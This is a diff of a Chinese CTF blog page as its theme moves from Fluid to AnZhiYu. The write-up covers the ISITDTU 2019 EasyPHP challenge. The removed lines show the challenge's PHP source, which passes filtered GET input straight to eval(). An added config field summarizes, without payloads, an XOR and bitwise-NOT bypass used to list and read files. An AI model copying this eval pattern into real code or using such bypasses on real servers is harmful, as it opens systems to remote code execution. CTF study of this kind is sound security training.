@@ -1,289 +1,215 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
-<head>
-  <meta charset="UTF-8">
-
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/imags/world.jpg">
-  
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="everythingis-ok">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="[ISITDTU 2019]EasyPHP并非easy。 12345678910111213&lt;?phphighlight_file(__FILE__);$_ &#x3D; @$_GET[&#x27;_&#x27;];if ( preg_match(&#x27;&#x2F;[\x00- 0-9\&#x27;&quot;&#96;$&amp;.,|[&#123;_defgops\x7F]+&#x2F;i&#x27;, $_) )">
-<meta property="og:type" content="article">
-<meta property="og:title" content="[ISITDTU 2019]EasyPHP">
-<meta property="og:url" content="http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/index.html">
-<meta property="og:site_name" content="haomeng&#39;s blog^^">
-<meta property="og:description" content="[ISITDTU 2019]EasyPHP并非easy。 12345678910111213&lt;?phphighlight_file(__FILE__);$_ &#x3D; @$_GET[&#x27;_&#x27;];if ( preg_match(&#x27;&#x2F;[\x00- 0-9\&#x27;&quot;&#96;$&amp;.,|[&#123;_defgops\x7F]+&#x2F;i&#x27;, $_) )">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110154812637.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110184305356-1762771388354-1.png">
-<meta property="article:published_time" content="2025-11-10T10:41:06.000Z">
-<meta property="article:modified_time" content="2025-11-10T10:48:08.812Z">
-<meta property="article:author" content="everythingis-ok">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110154812637.png">
-  
-  
-  
-  <title>[ISITDTU 2019]EasyPHP - haomeng&#39;s blog^^</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>[ISITDTU 2019]EasyPHP | haomeng's blog^^</title><meta name="author" content="everythingis-ok"><meta name="copyright" content="everythingis-ok"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="[ISITDTU 2019]EasyPHP"><meta name="application-name" content="[ISITDTU 2019]EasyPHP"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="[ISITDTU 2019]EasyPHP"><meta property="og:url" content="http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/index.html"><meta property="og:site_name" content="haomeng's blog^^"><meta property="og:description" content="[ISITDTU 2019]EasyPHP并非easy。 12345678910111213&amp;lt;?phphighlight_file(__FILE__);$_ &amp;#x3D; @$_GET[&amp;#x27;_&amp;#x27;];if ( preg_match(&amp;#x27;&amp;#x2F;[\x00- 0-9\&amp;#x27;&amp;amp;quo"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="everythingis-ok"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="[ISITDTU 2019]EasyPHP并非easy。 12345678910111213&amp;lt;?phphighlight_file(__FILE__);$_ &amp;#x3D; @$_GET[&amp;#x27;_&amp;#x27;];if ( preg_match(&amp;#x27;&amp;#x2F;[\x00- 0-9\&amp;#x27;&amp;amp;quo"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: everythingis-ok","link":"链接: ","source":"来源: haomeng's blog^^","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.css'
     }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'haomeng\'s blog^^',
+  title: '[ISITDTU 2019]EasyPHP',
+  postAI: '',
+  pageFillDescription: '[ISITDTU 2019]EasyPHP, references并非只要绕过两个就可以实现先看第一个正则匹配这个正则匹配的字符包括控制字符包括等空格数字标点符号字母及其大写再看第二个查询手册可以看到为时相当于统计字符种类数也就是说我们构造的里面字符种类不能超过中看了一个师傅的博客发现使用这个脚本可以得到不被禁止的函数名但是过滤结果没有可用函数北歌返回所有内置定义函数运行结果再看第一个发现没有过滤掉和我们可以考虑用按位取反执行成功后我们可以查看查看看一下可用函数发现所有的命令执行的函数都被禁了我们需要找到文件我们可以使用或者列目录但它返回一个数组我们还需要一个或直接暴力异或但是发现字符种类数超了解决思路是在这个不重复字符里删减一些删减的字符用其他字符异或来表示主要是和异或的那些字符串其他都是固定的用的是把替换原来的再和异或即原来的用脚本筛选一下可以被替换掉的字符不允许作为材料字符参与异或的字面字符注意这是字面字符集的限制与运算符无关你要求的不要把和用作材料是否允许引入额外的材料字符不在目标串中例如只有在时才生效预建元元查表值基字符集合默认用目标串已有字符去掉禁用字面字符查找元元替代材料都来自打印每个目标字符的部分替代方案避免过长这里各列举最多条可移除性把某个字符从可用材料里剔除后能否由剩余合成它这个检查的语义我们想删掉这个字面字符看看还能不能用剩余合成我们使用替换成再进行取反最后得出了将其传入得到当前目录的文件这个文件名太长了直接我们替换字符不好找可以用一些函数直接读数组最后一位使用可以返回数组的最后一项构造即可可以被替代的字符同样的方法构造配枪朱丽叶',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-10 18:48:08',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-
-  
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>everythingis-ok</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/images/zi.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="[ISITDTU 2019]EasyPHP"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-11-10 18:41" pubdate>
-          2025年11月10日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          1.6k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          13 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
       
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-      
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
-    </div>
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">[ISITDTU 2019]EasyPHP</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h1 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h1><p>并非easy。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosé will not do it&#x27;</span>);<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">haomeng's blog^^</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/00%E6%88%AA%E6%96%AD/" style="font-size: 1.05rem;">00截断<sup>1</sup></a><a href="/tags/0%E5%AE%BD%E9%9A%90%E5%86%99/" style="font-size: 1.05rem;">0宽隐写<sup>1</sup></a><a href="/tags/CTFhub/" style="font-size: 1.05rem;">CTFhub<sup>1</sup></a><a href="/tags/Ctfhub/" style="font-size: 1.05rem;">Ctfhub<sup>1</sup></a><a href="/tags/LSB%E9%9A%90%E5%86%99/" style="font-size: 1.05rem;">LSB隐写<sup>1</sup></a><a href="/tags/Linux%E5%91%BD%E4%BB%A4/" style="font-size: 1.05rem;">Linux命令<sup>1</sup></a><a href="/tags/MIME%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">MIME绕过<sup>1</sup></a><a href="/tags/NSSCTF/" style="font-size: 1.05rem;">NSSCTF<sup>4</sup></a><a href="/tags/NTFS%E6%95%B0%E6%8D%AE%E9%9A%90%E5%86%99/" style="font-size: 1.05rem;">NTFS数据隐写<sup>1</sup></a><a href="/tags/NewStarCTF2024/" style="font-size: 1.05rem;">NewStarCTF2024<sup>1</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>1</sup></a><a href="/tags/RCE%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">RCE绕过<sup>1</sup></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">SQL注入<sup>2</sup></a><a href="/tags/SSTI/" style="font-size: 1.05rem;">SSTI<sup>1</sup></a><a href="/tags/TGCTF/" style="font-size: 1.05rem;">TGCTF<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 1.05rem;">XXE<sup>1</sup></a><a href="/tags/create-function-%E5%87%BD%E6%95%B0/" style="font-size: 1.05rem;">create_function()函数<sup>1</sup></a><a href="/tags/handel%E8%AF%AD%E5%8F%A5/" style="font-size: 1.05rem;">handel语句<sup>1</sup></a><a href="/tags/md5%E7%A2%B0%E6%92%9E/" style="font-size: 1.05rem;">md5碰撞<sup>1</sup></a><a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">php代码审计<sup>1</sup></a><a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">php反序列化<sup>1</sup></a><a href="/tags/polarctf/" style="font-size: 1.05rem;">polarctf<sup>1</sup></a><a href="/tags/pop%E9%93%BE%E6%9E%84%E9%80%A0/" style="font-size: 1.05rem;">pop链构造<sup>1</sup></a><a href="/tags/python%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size: 1.05rem;">python反编译<sup>1</sup></a><a href="/tags/rce4/" style="font-size: 1.05rem;">rce4<sup>1</sup></a><a href="/tags/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.05rem;">session文件包含<sup>1</sup></a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 1.05rem;">信息泄露<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81/" style="font-size: 1.05rem;">前端验证<sup>1</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size: 1.05rem;">博客搭建<sup>1</sup></a><a href="/tags/%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BF%AE%E5%A4%8D/" style="font-size: 1.05rem;">压缩包修复<sup>1</sup></a><a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" style="font-size: 1.05rem;">图片隐写<sup>1</sup></a><a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">堆叠注入<sup>1</sup></a><a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">报错注入<sup>1</sup></a><a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">提权<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>3</sup></a><a href="/tags/%E6%9B%B4%E6%94%B9%E8%A1%A8%E5%90%8D/" style="font-size: 1.05rem;">更改表名<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 1.05rem;">编码<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/" style="font-size: 1.05rem;">编码解码<sup>1</sup></a><a href="/tags/%E9%9A%90%E5%86%99/" style="font-size: 1.05rem;">隐写<sup>1</sup></a><a href="/tags/%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5/" style="font-size: 1.05rem;">预编译语句<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/05/"><span class="card-archive-list-date">五月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/12/"><span class="card-archive-list-date">十二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/11/"><span class="card-archive-list-date">十一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/10/"><span class="card-archive-list-date">十月 2025</span><div class="card-archive-list-count-group"><span 